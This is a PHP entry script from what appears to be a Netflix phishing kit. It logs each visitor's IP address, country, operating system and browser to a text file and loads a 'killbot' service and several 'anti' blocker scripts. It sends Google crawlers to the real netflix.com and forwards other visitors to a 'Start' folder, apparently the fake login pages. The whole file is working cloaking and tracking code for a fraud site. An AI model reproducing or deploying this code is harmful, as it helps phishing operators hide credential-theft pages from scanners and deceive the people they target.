
<?php
include "/killbot/code/include.php";

$ip = getenv("REMOTE_ADDR");
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
$ip2 = getUserIP();
$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip2 . ""));
if ($details && $details->geoplugin_countryName != null) {
    $countryname = $details->geoplugin_countryName;
}
    $cn = $countryname;
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}
$os        =   getOS();
function getBrowser() {
    global $user_agent;
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
$br        =   getBrowser();
$file = fopen("UwU.txt","a");
fwrite($file,$ip2."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$cn | $os | $br] \n");
?>

<?php

    include("Start/system/blocker.php");
    include "anti/anti1.php";
    include "anti/anti2.php"; 
    include "anti/anti3.php"; 
    include "anti/anti4.php"; 
    include "anti/anti5.php"; 
    include "anti/anti6.php"; 
    include "anti/anti7.php"; 
    include "anti/anti8.php"; 
    include "anti/antiip.php"; 

    if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('Location: https://www.netflix.com/'); exit(); }
    if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('Location: https://www.netflix.com/'); exit(); }
$src="Start";
header("location:$src");
?>
